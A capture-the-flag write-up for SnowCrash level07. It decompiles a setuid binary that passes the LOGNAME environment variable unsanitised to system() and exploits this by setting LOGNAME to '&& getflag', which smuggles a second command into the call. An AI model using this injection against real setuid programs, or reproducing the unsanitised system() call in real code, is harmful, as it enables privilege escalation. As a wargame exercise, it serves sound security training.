We start by exploring the files and find an executable named `level07`

```
level07@SnowCrash:~$ ls
level07
```

Disassembling the binary in Ghidra shows the main function:

```
/* WARNING: Unknown calling convention */

int main(int argc,char **argv,char **envp)
{
  char *param2;
  int iVar1;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;

  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  param2 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",param2);
  iVar1 = system(local_1c);
  return iVar1;
}
```

1. **Environment Variable `LOGNAME`**

   - The program retrieves the environment variable `LOGNAME` using `getenv("LOGNAME")`.
   - It then uses `asprintf` to construct a command string in the format `"/bin/echo <LOGNAME>"`.

2. **System Call Vulnerability**:
   - The constructed command string is executed with `system(local_1c)`.
   - Since `LOGNAME` is directly inserted into the command, this can be exploited by injecting shell commands within `LOGNAME` to execute arbitrary commands.

We exploit this vulnerability by setting `LOGNAME` to include `getflag` as part of the command injection.

1. **Setting the Exploit Command**:

   - We set `LOGNAME` to `&& getflag` to chain `getflag` with the `echo` command.

   `level07@SnowCrash:~$ export LOGNAME="&& getflag"`

2. **Executing the Exploit**:
   - Running `./level07` triggers the command injection in `system(local_1c)` and runs `getflag`.

The output is:

```
level07@SnowCrash:~$ ./level07
Check flag.Here is your token :
```

The `getflag` command executes successfully, outputting the token.

This completes the exploit for Level07.
